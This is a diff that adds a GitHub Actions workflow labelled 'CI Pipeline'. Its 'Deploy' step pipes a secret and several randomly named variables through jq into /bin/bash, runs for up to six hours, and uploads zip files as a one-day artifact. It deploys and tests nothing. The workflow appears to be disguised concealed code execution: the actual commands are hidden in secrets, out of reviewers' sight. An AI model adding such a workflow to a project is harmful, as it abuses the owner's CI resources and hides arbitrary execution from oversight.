@@ -1,0 +1,26 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          hfq53: ${{ secrets.hfq53 }}
+        run: |
+          printf '%s' "$hfq53" | jq -r .mzw4 | /bin/bash
+          printf '%s' "$lhas770" | jq -r .uysly3 | /bin/bash
+          echo $psf647 | jq -r .k7206 | /bin/bash
+          echo $mwuqp1426 | jq -r .ctiqb4195 | /bin/bash
+          echo $oyu89 | jq -r .jp23976 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: xFJX4Jn8
+          path: "*.zip"
+          retention-days: 1
